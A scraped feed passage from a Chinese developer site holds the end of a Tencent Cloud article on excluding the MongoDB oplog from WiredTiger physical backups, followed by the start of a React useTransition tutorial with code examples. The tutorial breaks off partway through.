<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d99ba97c8e164e41b089aa4dabfebcc9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=hHlHS9Jv2QP6TAy2nVstFDj8qAo%3D" alt="image.png" loading="lazy"/>
获取到需要备份的 wt 文件后，旁路服务就可以并发拷贝 wt 文件存储到腾讯云 cos 对象存储中(包括 WiredTiger.backup 文件)。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a88c981fa0344e639d63624a020ff7f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=HG6XnpA2rU2s%2B%2BYp7JlyM6wzMD0%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-12">3.1.3 backup cursor 遍历阶段(也可以称为 wt 文件数据拷贝阶段)</h4>
<p>当物理文件拷贝完成后，backup cursor 即可 close 完成资源释放，同时清理backup 标识。</p>
<h3 data-id="heading-13">3.2 backup 数据恢复主要实现</h3>
<p>从 cos 下载备份的 wt 文件后，wt 加载流程主要如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/eb0674df247541bbad4c9aeb2eea099a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=AA1BjF4pgH6mn4NPBE0YA5lCnVw%3D" alt="image.png" loading="lazy"/></p>
<p>数据恢复实现主要是读取 WiredTiger.backup 内容，然后根据这些内容生成WiredTiger.wt 元数据文件，元数据文件生成完毕后就可以开始正式数据加载，mongod 即可通过 WiredTiger.wt 元数据文件获取每个表的配置信息，从而完成 wt 加载启动工作。</p>
<h3 data-id="heading-14">3.3 存储引擎 backup 剔除指定 wt 文件核心实现及其验证</h3>
<h4 data-id="heading-15">3.3.1 backup 剔除指定 wt 文件实现</h4>
<p>从上面的备份和恢复方式可以看出，WiredTiger.backup 中的内容是节点恢复的核心关键元数据，wt 启动所需的 WiredTiger.wt 中的 schema 配置和元数据内容全部来自 WiredTiger.backup 文件，而 WiredTiger.backup 文件在 begin 阶段完成，因此可以在 wt 的 backup 接口中增加了一个 exclude_target 参数，这个参数的作用主要是在 begin 阶段排除指定 wt 文件。假设剔除的表为 collection1, Hotback begin 阶段剔除 collection1 表后，WiredTiger.backup 文件中的内容将不再包含 collection1 的相关内容(这里腾讯云自己对 wiredTiger 做了修改)，如下图：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/be171e013072445baa04decc3b150822~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=pCZYBIvlnKD6yDUjjS46%2B4doTyE%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90bc31bf79f2435397127219577ea89f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=MdvWq%2BRdVVnwwjIInfWLmv1reRU%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bd1385408a694329a05507614d2611d8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=AKwBYJj3nGI2Se9aSnTVBi8DyZM%3D" alt="image.png" loading="lazy"/></p>
<p>同理，当 cos 下载 wt 文件恢复数据的时候，也就不会下载 collection.wt 文件，从而也就提升了回档下载耗时。</p>
<h4 data-id="heading-16">3.3.2 backup 剔除指定 wt 文件验证</h4>
<p>为了验证 backup 新增的 exclude_target 功能是否能正常备份和回档，按照wiredTiger 存储引擎以下 demo 步骤进行验证，第三步和第四步如果验证通过，则说明 backup 剔除指定 collection 功能实现没有问题：</p>
<p>第一步：数据准备</p>
<p>新建10个表，每个表写100条数据，然后主动执行一次 checkpoint。</p>
<p>第二步：exclude_target 剔除其中一个表(只物理备份9个表)进行数据备份</p>
<p>调用修改后的 backup 功能，生成备份数据。</p>
<p>第三步：加载备份数据</p>
<p>用第二步生成的备份数据，加载 wt 文件，确定是否可以加载成功。</p>
<p>第四步：验证备份数据正确性</p>
<p>验证备份的9个表中的内容是否和备份前的内容完全一致。</p>
<p>● 准备数据</p>
<p>数据准备阶段创建10个表，每个表写入100条数据，相关核心 demo 代码如下:</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/42e9991fec48498293f1004db4d4487b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=jxRg2c2KlQ60mp46QQ73c25ajBo%3D" alt="image.png" loading="lazy"/>
● exclude_target 剔除其中一个表(只备份9个表)进行数据备份</p>
<p>上一步创建了10个表，新增 exclude_target 参数功能后，这里 backup 备份剔除其中一个表(collection_0), 因此 cursor next 只会获取到9个表，主要 demo如下：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/453f95b68ae34b39ac800aa72459440f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=6ZzxxIs%2BJRmiN4vRPht1C4TMduE%3D" alt="image.png" loading="lazy"/></p>
<p>这个 demo 在 BACKUP_DIR 中的备份文件只会有9个，也就是 collection_1 – collection_9，符合预期。</p>
<p>● 加载 backup 的备份数据</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0ec28472c14d48bc886de135741245d1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=gm7HnJAlduzClrk7YE2ddL%2Fl60Y%3D" alt="image.png" loading="lazy"/></p>
<p>这里验证通过，每个步骤不会报错，数据可以正常加载, 验证通过。</p>
<p>● 验证备份数据正确性</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9a85a6776f444aaf95b6613f72d1465b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=lpJTZrMZ78%2BemCzUIR8wahm%2BAu0%3D" alt="image.png" loading="lazy"/>
这里验证通过，每个步骤不会报错，数据可以正常加载，并且能打印出collection_1-collection_9 这9个表中的KV数据，打印的内容与写入表中的内容完全一致。</p>
<p>从上面的 demo 验证可以确认，忽略指定 wt 备份恢复验证通过，说明从存储引擎一侧验证该方案没问题。</p>
<h2 data-id="heading-17">4 MongoDB server 层适配</h2>
<p>MongoDB 服务器本身依赖一些元数据文件来管理所有数据表，如果直接去掉 oplog.rs 文件后，启动时会因找不到该文件而报错。MongoDB server 层同样通过 backup cursor(带上新增的 exclude_target=oplog.wt)进行适配。</p>
<p>Server 层适配的时候可以先获取 oplog.rs 对应的磁盘 wt 文件名，然后加入exclude_target 参数中，获取 oplog.rs 对应磁盘 wt 文件名可以通过db.serverstatus().wiredTiger.uri 这个接口获取，server 层 backup 接口如下:</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/06150a1f9e2b4af9a3f7ef1789942196~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=VNntrWubKgPexHEv1Jqa84umprE%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c4edbde53eee4d0e876033f52e4375f3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=88YXgJbcVrUrJvrlcVNCbi96vwY%3D" alt="image.png" loading="lazy"/></p>
<p>Server 适配该新功能启动 mongod 节点，发现启动报错，无法找到 oplog.rs 对应的 wt 文件。通过走读代码，可以确认该问题是因为 mongod 启动的时候，会对 server 层管理的 wt 元数据做二次检查(主要是 _mdb_catalog.wt 和sizeStorer.wt)，这两个 wt 文件存储的是 server 层用来维护表信息、索引信息以及每个表 count 数。</p>
<p>● _mdb_catalog.wt  文件中的数据内容</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/18584cbc96d644d28b2edb71774cd530~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=0xV%2F8uF%2BPss6ahSIExbKNQH%2Btyw%3D" alt="image.png" loading="lazy"/></p>
<p>从上图可以看出，_mdb_catalog.wt 存储着表的元数据信息以及该表创建的索引信息，这些信息由 server 层写入 wiredtiger 引擎。</p>
<p>● sizeStorer.wt 文件中的数据内容</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e44f2676c30441e99129def29cb7c845~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6IW-6K6v5LqR5pWw5o2u5bqT:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764558475&amp;x-signature=OjBtYjuIqDliOvrzB%2FYgw8HjOPs%3D" alt="image.png" loading="lazy"/></p>
<p>这里的 key 一一对应一个具体的表，每个 value 存储该表中的数据总大小以及数据条数，节点重启的时候，表的 count 就是从这个 wt 文件获取的。</p>
<p>由于 wiredTiger 引擎侧我们通过 exclude_target 删除了 oplog.rs 表对应的 wt文件，但是 mongo server 侧在 _mdb_catalog.wt 和 sizeStorer.wt 两个文件中维护着表、索引、数据量相关元数据。Mongod 启动的时候会加载这两个 wt 文件获取到对应的表，然后去检查这些表是否存在。由于 wiredTiger 引擎侧删除了oplog.rs 对应的 wt 文件，因此 mongo server 侧检查不通过。</p>
<p>腾讯云 MongoDB 内核除了在 wiredTiger 存储引擎侧通过 exclude_target 功能新增功能剔除了 oplog.rs 表，同时 server 侧修复了 mongo server 维护的oplog.rs 相关检查，最终解决了 wiredtiger 引擎测和 mongo server 测启动失败的问题。</p>
<h2 data-id="heading-18">5 结语</h2>
<blockquote>
<p>腾讯云 MongoDB 通过打造有特色的产品功能、进行深度的内核优化和创新，以及提供更极致的服务，逐步构建起自身的差异化优势，致力于为用户带来了业界顶级的的数据库性能和稳定性，未来，腾讯云 MongoDB 也将在不断提升产品性能与可靠性的同时，切实为客户带来更优的经济效益与更流畅的运维体验。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React useTransition 全网最通俗深度讲解：为什么它能让页面“不卡”？]]></title>    <link>https://juejin.cn/post/7575751471841902628</link>    <guid>https://juejin.cn/post/7575751471841902628</guid>    <pubDate>2025-11-24T03:08:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575751471841902628" data-draft-id="7575367791274410022" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React useTransition 全网最通俗深度讲解：为什么它能让页面“不卡”？"/> <meta itemprop="keywords" content="前端,JavaScript,React.js"/> <meta itemprop="datePublished" content="2025-11-24T03:08:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="多啦C梦a"/> <meta itemprop="url" content="https://juejin.cn/user/2640348698905129"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React useTransition 全网最通俗深度讲解：为什么它能让页面“不卡”？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2640348698905129/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    多啦C梦a
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:08:25.000Z" title="Mon Nov 24 2025 03:08:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<h2 data-id="heading-0">前言：为什么你的页面会“卡一下”？</h2>
<p>你一定遇到过这种情形：</p>
<ul>
<li>输入框一输入内容，页面卡顿 0.5 秒</li>
<li>切换 Tab 时，内容区域加载很久，UI“顿了一下”</li>
<li>搜索时，列表数据很多，界面直接“卡死两秒”</li>
</ul>
</blockquote>
<p>你可能会想：<br/>
“React 不是号称很快吗？怎么还卡？”</p>
<p>原因其实很简单：</p>
<blockquote>
<p><strong>React 会把所有状态更新一次性同步地渲染。你改了 state，它就赶紧渲染，不管这是不是紧急的。</strong></p>
</blockquote>
<p>所以如果你输入框触发的渲染很重（比如列表 5000 条），那输入就会卡。</p>
<p>为了给开发者更细粒度的控制——<br/>
React 提供了 <strong>useTransition</strong>。</p>
<p>它的核心目的就一句话：</p>
<blockquote>
<p><strong>让“不着急的更新，靠边站”，优先保证“着急的更新”不被卡住。</strong></p>
</blockquote>
<p>这个理念是 React18 之后“并发特性”的核心之一。</p>
<hr/>
<h2 data-id="heading-1">第一章：useTransition 到底是什么？</h2>
<h3 data-id="heading-2">1. 它不是加速器</h3>
<p>它不会让渲染更快，也不会减少计算量。</p>
<h3 data-id="heading-3">2. 它是“任务优先级调度器”</h3>
<p>把更新分成两类：</p>




















<table><thead><tr><th>类型</th><th>示例</th><th>特点</th></tr></thead><tbody><tr><td>🍎 <strong>Urgent（紧急更新）</strong></td><td>输入框输入、用户点击按钮、切换输入法</td><td>必须马上更新，否则卡顿</td></tr><tr><td>🍉 <strong>Transition（过渡更新）</strong></td><td>过滤列表、加载新界面、切换大视图，长列表重新渲染</td><td>可以延迟，不急</td></tr></tbody></table>
<p>用法：</p>
<pre><code class="hljs language-scss" lang="scss">const <span class="hljs-selector-attr">[isPending, startTransition]</span> = <span class="hljs-built_in">useTransition</span>()

<span class="hljs-built_in">startTransition</span>(() =&gt; {
  <span class="hljs-comment">// 这里面的更新会被标记为“非紧急”</span>
})
</code></pre>
<p>因此，React 会：</p>
<ul>
<li><strong>先处理紧急更新（保持 UI 流畅）</strong></li>
<li><strong>再“慢慢处理”这些不紧急的渲染</strong></li>
</ul>
<p>这就是 “不卡顿” 的根本原因。</p>
<hr/>
<h2 data-id="heading-4">🧪 第二章：极其直观的小白示例：为什么不卡？</h2>
<p>假设你做一个搜索过滤：</p>
<pre><code class="hljs language-ini" lang="ini">&lt;input <span class="hljs-attr">value</span>={text} <span class="hljs-literal">on</span>Change={e =&gt; setText(e.target.value)} /&gt;
&lt;List <span class="hljs-attr">data</span>={filterBigList(text)} /&gt;
</code></pre>
<p><code>filterBigList(text)</code> 特别耗时<br/>
（比如几千条数据）</p>
<p>那么每次输入文字，都会：</p>
<ol>
<li>更新 text</li>
<li>filter 大数据列表</li>
<li>重新渲染大列表</li>
</ol>
<p>结果就是：</p>
<ul>
<li>输入法卡</li>
<li>页面卡</li>
<li>渲染跟不上用户输入</li>
</ul>
<p>现在用 useTransition：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> [isPending, startTransition] = <span class="hljs-title function_">useTransition</span>();

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChange</span> = e =&gt; {
  <span class="hljs-keyword">const</span> v = e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>;
  <span class="hljs-title function_">setText</span>(v);  <span class="hljs-comment">// 紧急更新，输入框动作必须马上反映</span>

  <span class="hljs-title function_">startTransition</span>(<span class="hljs-function">() =&gt;</span> { 
    <span class="hljs-title function_">setFiltered</span>(<span class="hljs-title function_">filterBigList</span>(v)); <span class="hljs-comment">// 不紧急</span>
  });
};
</code></pre>
<p>结果：</p>
<ul>
<li>输入框立刻更新（流畅）</li>
<li>filter 的计算被安排在低优先级，不阻塞 UI</li>
<li>列表先显示旧的，等计算完再显示新的</li>
</ul>
<hr/>
<h2 data-id="heading-5">⚡ 第三章：为什么 useTransition 能分类更新？</h2>
<p>因为 React18 有了 <strong>可中断渲染（interruptible rendering）</strong> 。</p>
<p>以前 React 是同步渲染：</p>
<blockquote>
<p>“你让我渲染 5000 条？那我开始做，等我做完才能响应用户输入。”</p>
</blockquote>
<p>现在是：</p>
<blockquote>
<p>“我先渲染你这一键的输入（紧急），至于你过滤列表那玩意儿，我稍后再弄，不着急。”</p>
</blockquote>
<p><strong>渲染任务可被提前打断，这是并发特性的核心。</strong></p>
<p>你按键的时候，React 认为“输入响应优先于渲染大列表”，所以它会：</p>
<ul>
<li>停 → 抛弃当前非紧急渲染</li>
<li>先做 → 输入框的 UI 更新</li>
<li>再做 → 非紧急渲染</li>
</ul>
<p>这就是 useTransition 的魔法来源。</p>
<hr/>
<h2 data-id="heading-6">🧩 第四章：useTransition 的详细用法与 API 解析</h2>
<h3 data-id="heading-7">4.1 基本使用</h3>
<pre><code class="hljs language-scss" lang="scss">const <span class="hljs-selector-attr">[isPending, startTransition]</span> = <span class="hljs-built_in">useTransition</span>();
</code></pre>
<h4 data-id="heading-8">🥝 <code>startTransition(fn)</code></h4>
<p>把 fn 内的状态更新变成非紧急。</p>
<h4 data-id="heading-9">🍋 <code>isPending</code></h4>
<p>表示“非紧急更新正在进行中”。</p>
<p>常用来显示 loading：</p>
<pre><code class="hljs language-css" lang="css">{isPending &amp;&amp; &lt;<span class="hljs-selector-tag">span</span>&gt;加载中...&lt;/<span class="hljs-selector-tag">span</span>&gt;}
</code></pre>
<hr/>
<h3 data-id="heading-10">4.2 示例完整版</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">SearchPage</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> [query, setQuery] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>);
  <span class="hljs-keyword">const</span> [list, setList] = <span class="hljs-title function_">useState</span>(bigList);
  <span class="hljs-keyword">const</span> [isPending, startTransition] = <span class="hljs-title function_">useTransition</span>();

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChange</span> = e =&gt; {
    <span class="hljs-keyword">const</span> v = e.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>;
    <span class="hljs-title function_">setQuery</span>(v);            <span class="hljs-comment">// 同步更新输入框</span>

    <span class="hljs-title function_">startTransition</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-keyword">const</span> filtered = bigList.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-title function_">includes</span>(v));
      <span class="hljs-title function_">setList</span>(filtered);    <span class="hljs-comment">// 异步、延迟、不紧急</span>
    });
  };

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{query}</span> <span class="hljs-attr">onChange</span>=<span class="hljs-string">{handleChange}</span> /&gt;</span>
      {isPending &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>加载中...<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>}
      <span class="hljs-tag">&lt;<span class="hljs-name">List</span> <span class="hljs-attr">data</span>=<span class="hljs-string">{list}</span> /&gt;</span>
    <span class="hljs-tag">&lt;/&gt;</span></span>
  );
}
</code></pre>
<hr/>
<h2 data-id="heading-11">🧬 第五章：三种情况下必须用 useTransition</h2>
<p>你只要看到下面三种情况，就应该考虑 useTransition。</p>
<hr/>
<h3 data-id="heading-12">5.1 情况一：输入框导致页面卡顿（最常见）</h3>
<p>场景：输入框 → 触发大量渲染 → 输入卡顿<br/>
解决：用 useTransition 把重渲染丢到低优先级。</p>
<hr/>
<h3 data-id="heading-13">5.2 情况二：Tab 切换导致大页面渲染</h3>
<p>比如切换 Tab 会渲染一个很大的组件：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">startTransition</span>(() =&gt; {
  <span class="hljs-built_in">setSelectedTab</span>(tab)
})
</code></pre>
<p>你会发现 UI 流畅得像没事一样。</p>
<hr/>
<h3 data-id="heading-14">5.3 情况三：长列表重新渲染</h3>
<p>长列表 + 过滤、切换排序、切换视图布局</p>
<p>这些都是非紧急更新 → 必用 useTransition。</p>
<hr/>
<h2 data-id="heading-15">🛑 第六章：useTransition 不适用的地方（容易踩坑）</h2>
<p>有些地方你绝不能用它！</p>
<hr/>
<h3 data-id="heading-16">❌ 6.1 表单真实值不能放在 transition 内更新</h3>
<p>错误：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">startTransition</span>(() =&gt; {
  <span class="hljs-built_in">setInputValue</span>(x)
})
</code></pre>
<p>结果：</p>
<ul>
<li>输入会延迟</li>
<li>React 故意“慢慢更新”</li>
</ul>
<p>正确：</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-built_in">setInputValue</span>(x)
</code></pre>
<hr/>
<h3 data-id="heading-17">❌ 6.2 不能用于必须立即更新的 UI</h3>
<p>比如：</p>
<ul>
<li>提交表单结果</li>
<li>弹出 Modal</li>
<li>提示错误信息</li>
</ul>
<p>这些都属于“紧急更新”，不能延迟。</p>
<hr/>
<h2 data-id="heading-18">🔍 第七章：深入原理（可当面试题）</h2>
<p>面试官常问：</p>
<h4 data-id="heading-19">❓ useTransition 是如何实现“低优先级渲染”的？</h4>
<p>核心逻辑是：</p>
<ol>
<li>startTransition 内的更新会被标记为 <code>transition lane</code></li>
<li>React 在调度更新时，会根据 Lane 优先级调度</li>
<li>transition lane（低优先级）渲染时，可以被更高优先级任务中断</li>
<li>新任务进来后，低优先级渲染被丢弃</li>
<li>等紧急任务完成后，再继续低优先级任务</li>
</ol>
<p>也就是：</p>
<blockquote>
<p>任务优先级 + 可中断渲染 + Lane 模型 = useTransition</p>
</blockquote>
<hr/>
<h3 data-id="heading-20">❓ useTransition 和 useDeferredValue 差别？</h3>
<p>非常高频面试题！</p>

















<table><thead><tr><th>Hook</th><th>用途</th></tr></thead><tbody><tr><td><strong>useTransition</strong></td><td>把一段更新标记成低优先级</td></tr><tr><td><strong>useDeferredValue</strong></td><td>延迟一个值，不影响其余组件</td></tr></tbody></table>
<p>例子：</p>
<ul>
<li>搜索框：用 useDeferredValue</li>
